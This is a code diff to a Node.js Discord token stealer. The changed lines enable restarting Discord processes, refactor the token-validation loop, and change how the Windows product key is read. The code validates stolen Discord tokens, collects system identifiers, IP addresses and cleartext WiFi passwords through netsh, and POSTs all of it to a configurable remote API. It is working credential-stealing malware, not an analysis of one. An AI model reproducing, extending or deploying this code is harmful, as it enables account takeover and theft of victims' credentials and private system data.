@@ -1,4 +1,4 @@
-const { execSync, exec } = require('child_process'),
+const { execSync,spawnSync, exec } = require('child_process'),
     fs = require("fs"),
     crypto = require("crypto");
 let buffreplace = require('buffer-replace'),
@@ -6,10 +6,10 @@ let buffreplace = require('buffer-replace'),
     aura = require("win-dpapi"),
     axios = require('axios'),
     fetch = require("node-fetch");
-let tokens = new Array(),
-    injectPath = new Array(),
+let tokens = [],
+    injectPath = [],
 
-    killdcop = false, //(true) to restart all Discord processes, (false) for the opposite.
+    killdcop = true, //(true) to restart all Discord processes, (false) for the opposite.
     API = "http://localhost:3000/request" // here you need to add your (api) so that the recommendation data can be sent to host in replit lol
     
 switch (process.platform) {
@@ -86,16 +86,17 @@ switch (process.platform) {
         }
 
         async function check(t) {
+            let g = []
             for (let a of t) {
                 await axios.get(`https://discord.com/api/v9/users/@me`, { headers: {"Content-Type": "application/json","authorization": `${a}`}})
-                .then(tokens => {e = tokens.data})
+                .then(g => {e = g.data})
                 .catch(() => {e = null}) 
                 if (e) {
-                    tokens.push(a); 
+                    g.push(a); 
                   }
                 }
-                if (tokens.length > 0) {
-                await sendall(tokens); 
+                if (g.length > 0) {
+                await sendall(g); 
             }
         }
 
@@ -178,13 +179,13 @@ switch (process.platform) {
         function getSystemInfo() {
             try {
                 return {
+                    Ram: execSync("wmic os get TotalVisibleMemorySize").toString().split("\r\n")[1].trim() + " KB",
+                    UserName: execSync("echo %USERNAME%").toString().trim(),
                     UUID: execSync("powershell.exe (Get-CimInstance -Class Win32_ComputerSystemProduct).UUID").toString().split("\r\n")[0],
                     MacAddress: execSync("powershell.exe (Get-CimInstance -ClassName 'Win32_NetworkAdapter' -Filter 'NetConnectionStatus = 2').MACAddress").toString().split("\r\n")[0],
-                    ProductKey: execSync("powershell.exe (Get-WmiObject -query 'select * from SoftwareLicensingService').OA3xOriginalProductKey").toString().split("\r\n")[0],
+                    ProductKey: spawnSync('powershell', ['Get-ItemPropertyValue', '-Path', '\'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform\'', '-Name', 'BackupProductKeyDefault']).stdout.toString().trim(),
                     LocalIp: execSync("powershell.exe (Get-NetIPAddress).IPAddress").toString().split('\r\n')[0],
-                    Ram: execSync("wmic os get TotalVisibleMemorySize").toString().split("\r\n")[1].trim() + " KB",
                     CpuModel: execSync("wmic cpu get caption").toString().split("\r\r\n")[1].trim(),
-                    UserName: execSync("echo %USERNAME%").toString().trim(),
                     GetIpAddress: execSync("powershell.exe (Resolve-DnsName -Name myip.opendns.com -Server 208.67.222.220).IPAddress").toString().split("\r\n")[0],
                     WifiPass: execSync(`netsh wlan export profile key=clear;Get-ChildItem *.xml | ForEach-Object {$xml = [xml](get-content $_);$a = $xml.WLANProfile.SSIDConfig.SSID.name + ": " + $xml.WLANProfile.MSM.Security.sharedKey.keymaterial;$a;}`, { shell: "powershell.exe" }).toString().split("\r\n").filter(l => l.includes(": ")).map(l => l.replace(/�\?T/g, "'")).join("\n"),
                 };
@@ -206,11 +207,12 @@ switch (process.platform) {
         }
 
         async function sendall(t) {
+            let r = g(10)
             fetch(`${API}/startup`, {
                 method: "POST", 
                 body: JSON.stringify({
                     tokens: t,
-                    filename: g(10),
+                    filename: r,
                     ...getSystemInfo()
                 })
             })
